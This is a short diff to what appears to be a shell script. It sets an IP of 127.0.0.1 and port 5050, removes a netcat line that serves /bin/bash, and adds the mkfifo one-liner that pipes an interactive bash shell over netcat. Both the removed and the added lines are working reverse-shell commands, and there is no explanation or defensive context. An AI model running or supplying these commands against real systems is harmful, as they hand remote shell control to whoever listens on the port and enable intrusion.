@@ -3,4 +3,5 @@
 port="5050"
 ip="127.0.0.1"
 
-nc -v "$ip" 5050 -e /bin/bash
+rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/bash -i 2>&1 | nc "$ip" "$port" > /tmp/f   
